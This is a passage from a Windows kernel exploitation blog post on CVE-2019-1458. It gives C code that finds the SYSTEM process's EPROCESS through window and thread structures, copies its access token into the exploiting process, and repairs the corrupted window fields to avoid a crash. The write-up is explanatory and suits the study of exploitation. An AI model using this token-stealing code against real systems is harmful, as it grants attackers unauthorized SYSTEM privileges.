<p>Unfortunately this approach will not work when exploiting the vulnerability from a Wow64 process!</p>

<p>In order to achieve full coverage, we will need to use another approach!</p>

<p>Let’s have a look at the THRDESKHEAD object on WinDBG, the header for user objects that can be owned by a thread and are specific to a desktop (it begins the tagWND structure):</p>

<div align="center"><img src="/images/thrDeskHead.png" height="150" width="700" /> </div>
<p><br /></p>

<p>If we see the picture above, we can get a pointer to a tagTHREADINFO structure at offset 0x10 of the tagWND.</p>

<p>To get this pointer, we can just use our kernel Read primitive:</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="n">ULONG64</span> <span class="n">tagTHREADINFO</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
<span class="n">readQWORD</span><span class="p">(</span><span class="n">tagWNDKernelAddress</span> <span class="o">+</span> <span class="mh">0x10</span><span class="p">,</span><span class="o">&amp;</span><span class="n">tagTHREADINFO</span><span class="p">);</span></code></pre></figure>

<p>The tagTHREADINFO is a pretty complex structure, but we will not need to fully understand it to successfully exploit this vulnerability.</p>

<div align="center"><img src="/images/tagTHREADINFO.png" height="300" width="700" /> </div>
<p><br /></p>

<p>If we look at offset 0x158 we will see a pointer to a tagPROCESSINFO structure.</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="n">ULONG64</span> <span class="n">tagTHREADINFO</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
<span class="n">readQWORD</span><span class="p">(</span><span class="n">tagWNDKernelAddress</span> <span class="o">+</span> <span class="mh">0x10</span><span class="p">,</span><span class="o">&amp;</span><span class="n">tagTHREADINFO</span><span class="p">);</span>
<span class="n">ULONG64</span> <span class="n">tagPROCESSINFOAddress</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
<span class="n">readQWORD</span><span class="p">(</span><span class="n">tagTHREADINFO</span> <span class="o">+</span> <span class="mh">0x158</span><span class="p">,</span><span class="o">&amp;</span><span class="n">tagPROCESSINFOAddress</span><span class="p">);</span></code></pre></figure>

<p><br /></p>

<div align="center"><img src="/images/tagPROCESSINFO.png" height="300" width="700" /> </div>
<p><br /></p>

<p>As you can see in the picture above, the first field of the tagPROCESSINFO  is a pointer to the current process EPROCESS structure!</p>

<p>This means that we can just use our kernel Read Primitive to access the first field of the tagPROCESSINFO structure and obtain the address of our process’ EPROCESS structure!</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="n">ULONG64</span> <span class="n">tagTHREADINFO</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
<span class="n">readQWORD</span><span class="p">(</span><span class="n">tagWNDKernelAddress</span> <span class="o">+</span> <span class="mh">0x10</span><span class="p">,</span><span class="o">&amp;</span><span class="n">tagTHREADINFO</span><span class="p">);</span>
<span class="n">ULONG64</span> <span class="n">tagPROCESSINFOAddress</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
<span class="n">readQWORD</span><span class="p">(</span><span class="n">tagTHREADINFO</span> <span class="o">+</span> <span class="mh">0x158</span><span class="p">,</span><span class="o">&amp;</span><span class="n">tagPROCESSINFOAddress</span><span class="p">);</span>
<span class="n">ULONG64</span> <span class="n">eprocessAddress</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
<span class="n">readQWORD</span><span class="p">(</span><span class="n">tagPROCESSINFOAddress</span><span class="p">,</span><span class="o">&amp;</span><span class="n">eprocessAddress</span><span class="p">);</span></code></pre></figure>

<p>In order to get the address of the SYSTEM EProcess structure, we will need to iterate the LIST_ENTRY ActiveProcessLinks field starting from our process’ EPROCESS structure looking for an EPROCESS structure having PID 0x4 (the SYSTEM process) as you can see in the example code below:</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="n">ULONG64</span> <span class="nf">getCurrentProcessEProcess</span><span class="p">(</span><span class="n">ULONG64</span> <span class="n">tagWNDAddress</span><span class="p">)</span>
<span class="p">{</span>
	<span class="n">ULONG64</span> <span class="n">tagTHREADINFO</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>

	<span class="n">readQWORD</span><span class="p">(</span><span class="n">tagWNDAddress</span> <span class="o">+</span> <span class="mh">0x10</span><span class="p">,</span><span class="o">&amp;</span><span class="n">tagTHREADINFO</span><span class="p">);</span>

	<span class="n">ULONG64</span>	<span class="n">tagPROCESSINFO</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>

	<span class="n">readQWORD</span><span class="p">(</span><span class="n">tagTHREADINFO</span> <span class="o">+</span> <span class="mh">0x158</span><span class="p">,</span><span class="o">&amp;</span><span class="n">tagPROCESSINFO</span><span class="p">);</span>

	<span class="n">ULONG64</span>  <span class="n">eprocessAddress</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>

	<span class="n">readQWORD</span><span class="p">(</span><span class="n">tagPROCESSINFO</span><span class="p">,</span><span class="o">&amp;</span><span class="n">eprocessAddress</span><span class="p">);</span>

	<span class="k">return</span> <span class="n">eprocessAddress</span><span class="p">;</span>

<span class="p">}</span>

<span class="kt">void</span> <span class="nf">setSystemToken</span><span class="p">(</span><span class="n">ULONG64</span> <span class="n">tagWNDAddress</span><span class="p">)</span>
<span class="p">{</span>
	<span class="n">ULONG64</span> <span class="n">currentEProcess</span> <span class="o">=</span> <span class="n">getCurrentProcessEProcess</span><span class="p">(</span><span class="n">tagWNDAddress</span><span class="p">);</span>

	<span class="n">ULONG64</span> <span class="n">tempEProcess</span> <span class="o">=</span> <span class="n">currentEProcess</span><span class="p">;</span>

	<span class="n">ULONG64</span> <span class="n">currentProcID</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>

	<span class="n">readQWORD</span><span class="p">(</span><span class="n">currentEProcess</span> <span class="o">+</span> <span class="mh">0x180</span><span class="p">,</span><span class="o">&amp;</span><span class="n">currentProcID</span><span class="p">);</span>

	<span class="k">if</span><span class="p">(</span><span class="n">currentProcID</span> <span class="o">!=</span> <span class="n">GetCurrentProcessId</span><span class="p">())</span>
		<span class="k">return</span><span class="p">;</span>

	<span class="k">while</span><span class="p">(</span><span class="n">TRUE</span><span class="p">)</span>
	<span class="p">{</span>
		<span class="n">ULONG64</span> <span class="n">activeProcessLinks</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>

		<span class="n">readQWORD</span><span class="p">(</span><span class="n">tempEProcess</span> <span class="o">+</span> <span class="mh">0x188</span><span class="p">,</span><span class="o">&amp;</span><span class="n">tempEProcess</span><span class="p">);</span> <span class="c1">//0x188 is the offset of ActiveProcessLinks on Windows 7 x64</span>

		<span class="n">tempEProcess</span> <span class="o">-=</span> <span class="mh">0x188</span><span class="p">;</span>
		<span class="n">ULONG64</span> <span class="n">uniqueProcessID</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>

		<span class="n">readQWORD</span><span class="p">(</span><span class="n">tempEProcess</span> <span class="o">+</span> <span class="mh">0x180</span><span class="p">,</span><span class="o">&amp;</span><span class="n">uniqueProcessID</span><span class="p">);</span> <span class="c1">// 0x180 is the offset of UniqueProcessID on Windows 7 x64</span>

		<span class="k">if</span><span class="p">(</span><span class="n">uniqueProcessID</span> <span class="o">==</span> <span class="mi">4</span><span class="p">)</span>
			<span class="k">break</span><span class="p">;</span>

	<span class="p">}</span>

	<span class="n">ULONG64</span> <span class="n">systemToken</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>

	<span class="n">readQWORD</span><span class="p">(</span><span class="n">tempEProcess</span> <span class="o">+</span> <span class="mh">0x208</span><span class="p">,</span><span class="o">&amp;</span><span class="n">systemToken</span><span class="p">);</span> <span class="c1">//0x208 is the offset of TOKEN on Windows 7 x64</span>

	<span class="n">writeQWORD</span><span class="p">(</span><span class="n">currentEProcess</span> <span class="o">+</span> <span class="mh">0x208</span><span class="p">,</span><span class="n">systemToken</span><span class="p">);</span>

<span class="p">}</span></code></pre></figure>

<p>Once we have all the needed addresses, we will just need to use our Read primitive to steal the TOKEN of the SYSTEM process and use our write primitive to overwrite our process TOKEN with the SYSTEM token we have just stolen!</p>

<p>Great! We are now SYSTEM!
Unfortunately, as long as we will close our application, the system will crash!</p>

<h2 id="fixing-corrupted-tagwnd-structure">Fixing corrupted tagWND structure</h2>

<p>In the chapters before, I reminded you that the arbitrary dereference is triggered at four different offsets. In other words, the cbwndExtra will not be the only tagWND field which will be corrupted.</p>

<p>Since the crash happens only after closing the application, we will just need to make sure to use our WWW primitive to fix the corrupted addresses before terminating execution.</p>

<p>In order to achieve our goal, we will rely on the fact that the HMValidateHandle function will give us read-only access to the tagWND kernel structure data, allowing us to save all the needed values before corrupting them when triggering the vulnerability.</p>

<p>Let’s take a look at the following pseudo C code which will make use of our WWW primitive to fix the corrupted structures:</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="n">writeQWORD</span><span class="p">(</span><span class="n">corruptedWindowKernelAddress</span> <span class="o">+</span> <span class="mh">0xF0</span><span class="p">,</span> <span class="n">spwndOriginal</span><span class="p">);</span>
<span class="n">writeQWORD</span><span class="p">(</span><span class="n">corruptedWindowKernelAddress</span> <span class="o">+</span> <span class="mh">0xE0</span><span class="p">,</span> <span class="n">originalValue</span><span class="p">);</span>
<span class="n">writeQWORD</span><span class="p">(</span><span class="n">corruptedWindowKernelAddress</span> <span class="o">+</span> <span class="mh">0xD8</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span> <span class="c1">// Sets to NULL the strName field</span>
<span class="n">writeQWORD</span><span class="p">(</span><span class="n">adjacentWindowKernelAddress</span> <span class="o">+</span> <span class="mh">0xE0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span></code></pre></figure>

<p>After fixing this issue, our exploit will stop crashing the system after closing the application!</p>

<h2 id="conclusion">Conclusion</h2>

<p>I consider CVE-2019-1458 a great vulnerability to get started with Windows Kernel Exploitation since it is pretty easy to exploit.
I think I will publish in the next weeks another article explaining how to exploit this vulnerability on Windows 10.
Full source code to exploit this vulnerability will be published in the next days!</p>

  </div><a class="u-url" href="/windows/exploitation/2020/06/03/exploitingcve2019-1458.html" hidden></a>
</article>

      </div>
    </main><footer class="site-footer h-card">
  <data class="u-url" href="/"></data>

  <div class="wrapper">

    <h2 class="footer-heading">ByteRaptors</h2>

    <div class="footer-col-wrapper">
      <div class="footer-col footer-col-1">
        <ul class="contact-list">
          <li class="p-name">ByteRaptors</li><li><a class="u-email" href="mailto:byteraptors@protonmail.com">byteraptors@protonmail.com</a></li></ul>
      </div>

      <div class="footer-col footer-col-2"><ul class="social-media-list"><li><a href="https://github.com/jekyll"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#github"></use></svg> <span class="username">jekyll</span></a></li><li><a href="https://www.twitter.com/jekyllrb"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#twitter"></use></svg> <span class="username">jekyllrb</span></a></li></ul>
</div>

      <div class="footer-col footer-col-3">
        <p>Windows Internals, Binary Exploitation and Reverse Engineering.</p>
      </div>
    </div>

  </div>

</footer>
</body>

</html>
